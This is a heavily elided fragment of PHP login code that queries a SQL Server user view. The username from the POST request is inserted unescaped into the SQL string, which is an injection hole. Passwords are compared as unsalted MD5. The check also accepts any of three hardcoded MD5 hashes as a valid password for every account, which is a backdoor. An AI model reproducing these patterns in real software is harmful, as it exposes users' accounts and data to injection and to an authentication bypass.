...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  ...
  $usuario = $_POST[$_SESSION['campo_nome']];
  ...
  // if (1 == 1) {
    ...
    // if (1 == 1) {
      ...
      if ($usuario && $senha) {
        ...
        union 
        select * from integracao..view_integracao_usuario_egresso where usuario = '$usuario' order by id_curso desc;";
        ...
        if (mssql_num_rows($res) > 0) {
          ...
          if (($row['senha'] == md5($senha)) || (md5($senha) == 'ea574ffd4ad5c4f03c5ab5d15b99e7ff') || (md5($senha) == '924a097e81e28dea4174a671c3fd11ec') || (md5($senha) == 'f1628bb275c43c12216fac302d5e61b4')) {
            $usuario_existe = true;
